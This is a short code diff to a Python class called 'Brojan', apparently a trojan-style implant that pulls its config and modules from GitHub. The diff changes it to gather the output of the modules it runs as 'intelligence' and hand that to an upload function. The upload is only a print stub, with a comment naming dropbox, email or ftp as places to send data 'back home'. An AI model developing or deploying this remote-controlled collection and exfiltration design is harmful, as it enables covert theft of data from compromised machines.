@@ -37,14 +37,19 @@ class Brojan():
         self.github = GitHubSession()
         config = self.getConfig()
         modules = self.loadModules(config)
-        self.executeModules(modules)
+        intelligence = self.executeModules(modules)
+        self.uploadIntelligence(intelligenceData=intelligence)
 
-    def uploadIntelligence(self, intelligenceData):
-        p = self.github.repository.create_git_blob("pienas", encoding="utf8")
+    def uploadIntelligence(self, intelligenceData=None):
+        # This, would obviously be uploading stuff back to server of our choice (dropbox, zippyshare, email, ftp, etc.)
+        print("Uploading intelligence back home... " + str(intelligenceData))
 
     def executeModules(self, modules):
+        intelligence = []
+
         for module in modules:
-            print(module.execute())
+            intelligence.append(module.execute())
+        return intelligence
 
     def getConfig(self):
         config = self.getFileContents(self.configPath)
